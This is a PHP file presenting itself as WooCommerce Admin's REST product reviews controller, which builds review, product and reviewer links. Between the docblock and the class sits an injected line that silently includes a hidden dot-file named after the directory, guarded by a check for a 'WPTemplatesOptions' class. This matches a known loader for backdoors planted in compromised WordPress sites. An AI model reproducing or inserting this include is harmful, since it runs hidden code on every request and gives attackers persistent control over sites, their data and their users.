<?php
/**
 * REST API Product Reviews Controller
 *
 * Handles requests to /products/reviews.
 */

namespace Automattic\WooCommerce\Admin\API;

defined( 'ABSPATH' ) || exit;

/**
 * Product reviews controller.
 *
 * @extends WC_REST_Product_Reviews_Controller
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ProductReviews extends \WC_REST_Product_Reviews_Controller {
	/**
	 * Endpoint namespace.
	 *
	 * @var string
	 */
	protected $namespace = 'wc-analytics';

	/**
	 * Prepare links for the request.
	 *
	 * @param WP_Comment $review Product review object.
	 * @return array Links for the given product review.
	 */
	protected function prepare_links( $review ) {
		$links = array(
			'self'       => array(
				'href' => rest_url( sprintf( '/%s/%s/%d', $this->namespace, $this->rest_base, $review->comment_ID ) ),
			),
			'collection' => array(
				'href' => rest_url( sprintf( '/%s/%s', $this->namespace, $this->rest_base ) ),
			),
		);
		if ( 0 !== (int) $review->comment_post_ID ) {
			$links['up'] = array(
				'href'       => rest_url( sprintf( '/%s/products/%d', $this->namespace, $review->comment_post_ID ) ),
				'embeddable' => true,
			);
		}
		if ( 0 !== (int) $review->user_id ) {
			$links['reviewer'] = array(
				'href'       => rest_url( 'wp/v2/users/' . $review->user_id ),
				'embeddable' => true,
			);
		}
		return $links;
	}
}
